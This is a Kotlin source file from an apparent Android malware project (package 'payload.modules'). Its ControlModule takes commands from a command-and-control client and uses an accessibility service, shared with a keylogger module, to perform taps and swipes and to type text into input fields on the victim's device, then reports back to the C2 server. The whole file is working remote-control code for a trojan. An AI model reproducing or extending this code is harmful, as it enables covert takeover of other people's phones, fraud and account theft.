package com.ihk909.payload.modules

import android.accessibilityservice.GestureDescription
import android.content.Context
import android.graphics.Path
import android.os.Bundle
import android.view.accessibility.AccessibilityNodeInfo
import com.ihk909.payload.C2Client
import org.json.JSONObject

object ControlModule {
    fun gesture(ctx: Context, c2: C2Client, id: String, args: JSONObject) {
        val svc = KeyloggerModule.lastService
        if (svc == null) {
            c2.replyError(id, "accessibility not enabled")
            return
        }
        runCatching {
            when (args.optString("type", "tap")) {
                "tap" -> {
                    val p = Path().apply {
                        moveTo(args.getDouble("x").toFloat(), args.getDouble("y").toFloat())
                    }
                    svc.dispatchGesture(
                        GestureDescription.Builder()
                            .addStroke(GestureDescription.StrokeDescription(p, 0, 60))
                            .build(), null, null)
                }
                "swipe" -> {
                    val p = Path().apply {
                        moveTo(args.getDouble("x1").toFloat(), args.getDouble("y1").toFloat())
                        lineTo(args.getDouble("x2").toFloat(), args.getDouble("y2").toFloat())
                    }
                    svc.dispatchGesture(
                        GestureDescription.Builder()
                            .addStroke(GestureDescription.StrokeDescription(
                                p, 0, args.optLong("ms", 300)))
                            .build(), null, null)
                }
            }
            c2.reply(id, JSONObject().put("ok", true))
        }.onFailure { c2.replyError(id, it.message ?: "error") }
    }

    fun text(ctx: Context, c2: C2Client, id: String, args: JSONObject) {
        val svc = KeyloggerModule.lastService
        if (svc == null) {
            c2.replyError(id, "accessibility not enabled")
            return
        }
        runCatching {
            val root = svc.rootInActiveWindow
            if (root == null) {
                c2.replyError(id, "no window")
                return@runCatching
            }
            val focus = root.findFocus(AccessibilityNodeInfo.FOCUS_INPUT)
            if (focus == null) {
                c2.replyError(id, "no input focus")
                return@runCatching
            }
            val bundle = Bundle().apply {
                putCharSequence(
                    AccessibilityNodeInfo.ACTION_ARGUMENT_SET_TEXT_CHARSEQUENCE,
                    args.getString("text"))
            }
            focus.performAction(AccessibilityNodeInfo.ACTION_SET_TEXT, bundle)
            c2.reply(id, JSONObject().put("ok", true))
        }.onFailure { c2.replyError(id, it.message ?: "error") }
    }
}